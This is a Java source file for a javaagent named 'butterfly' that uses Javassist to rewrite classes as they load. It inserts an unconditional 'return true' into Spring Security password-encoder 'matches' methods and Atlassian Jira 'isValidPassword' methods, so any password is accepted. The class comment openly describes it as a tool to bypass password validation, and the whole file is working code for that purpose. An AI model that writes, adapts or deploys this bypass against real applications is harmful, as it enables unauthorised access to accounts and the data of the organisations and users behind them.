package com.Ox08.butterfly;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.runtime.Desc;
import javassist.scopedpool.ScopedClassPoolFactoryImpl;
import javassist.scopedpool.ScopedClassPoolRepositoryImpl;

import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
/**
 * This class allows to bypass password validation for Spring Security-based apps and
 * for Atlassian Jira
 *
 * @author Alex Chernyshev <alex3.145@gmail.com>
 * @since 1.0
 *
 */
public class BypassPasswordChecks {
    public static void premain(String agentArgs, Instrumentation instrumentation) {
        System.out.println("Starting butterfly..");
        //Sets the useContextClassLoader =true to get any class type to be correctly resolved with correct OSGI module
        Desc.useContextClassLoader = true;
        instrumentation.addTransformer(new InterceptingClassTransformer());
    }
    static class InterceptingClassTransformer implements ClassFileTransformer {
        private static final String BYPASS_PAYLOAD = "if (true) { System.out.println(\"Bypassing password check..\"); return true; }";
        private final ScopedClassPoolFactoryImpl scopedClassPoolFactory = new ScopedClassPoolFactoryImpl();
        private final ClassPool rootPool = ClassPool.getDefault();
        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                                ProtectionDomain protectionDomain, byte[] classfileBuffer) {
            final boolean foundSpring = checkIfSpringSecurityPasswordEncoder(className),
                    foundAtlassian = checkIfAtlassianSecurityPasswordEncoder(className);
            if (!foundSpring && !foundAtlassian) {
                return classfileBuffer;
            }
            System.out.printf("processing class %s%n", className);
            try {
                final CtClass ctClass = scopedClassPoolFactory.create(loader, rootPool,
                                ScopedClassPoolRepositoryImpl.getInstance())
                        .makeClass(new ByteArrayInputStream(classfileBuffer));
                // пропускаем интерфейсы и всякую херь
                if (ctClass.isInterface() || ctClass.isAnnotation()
                        || ctClass.isPrimitive() || ctClass.isArray() || ctClass.isEnum()) {
                    return classfileBuffer;
                }
                for (CtMethod method : ctClass.getDeclaredMethods()) {
                    if ((foundAtlassian && method.getName().equals("isValidPassword"))
                            || (foundSpring && method.getName().equals("matches"))) {
                        method.insertBefore(BYPASS_PAYLOAD);
                        System.out.printf("altered method: %s%n", method.getName());
                        break;
                    }
                }
                final byte[] byteCode = ctClass.toBytecode();
                ctClass.detach();
                return byteCode;
            } catch (Throwable ex) {
                System.err.printf("Error transforming class: %s%n", ex.getMessage());
                return classfileBuffer;
            }
        }
        private boolean checkIfSpringSecurityPasswordEncoder(String className) {
            return className.contains("org/springframework/security/") && className.endsWith("Encoder");
        }
        private boolean checkIfAtlassianSecurityPasswordEncoder(String className) {
            /*
            @see com.atlassian.security.password.DefaultPasswordEncoder
             */
            return className.contains("com/atlassian/security/") && className.endsWith("Encoder");
        }
    }
}
